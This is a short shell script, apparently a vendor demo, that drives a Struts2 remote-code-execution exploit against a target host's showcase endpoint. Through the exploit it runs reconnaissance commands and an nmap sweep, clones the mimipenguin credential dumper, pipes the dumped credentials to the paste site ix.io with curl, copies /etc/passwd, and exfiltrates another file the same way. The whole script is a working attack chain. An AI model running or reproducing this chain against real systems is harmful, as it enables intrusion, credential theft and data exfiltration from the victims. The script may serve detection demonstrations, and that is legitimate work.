# exploit.sh
# maintainer Neil Carpenter <neil@twistlock.com>
#
#

# Sleeps are there to let actions complete

python2 /struts2/strutsrce.py --target=http://$1:18080/showcase.action --cmd='uname -a'
sleep 5
python2 /struts2/strutsrce.py --target=http://$1:18080/showcase.action --cmd='ps -ef'
python2 /struts2/strutsrce.py --target=http://$1:18080/showcase.action --cmd='/usr/bin/nmap -sP 172.18.0.1-20'
python2 /struts2/strutsrce.py --target=http://$1:18080/showcase.action --cmd='/usr/bin/git clone https://github.com/huntergregal/mimipenguin.git'
sleep 60
python2 /struts2/strutsrce.py --target=http://$1:18080/showcase.action --cmd="./mimipenguin/mimipenguin.sh | curl -F 'f:1=<-' ix.io"
python2 /struts2/strutsrce.py --target=http://$1:18080/showcase.action --cmd='cp /etc/passwd /tmp/out'
python2 /struts2/strutsrce.py --target=http://$1:18080/showcase.action --cmd='cat file.ext | curl -F "f:1=<-" ix.io'
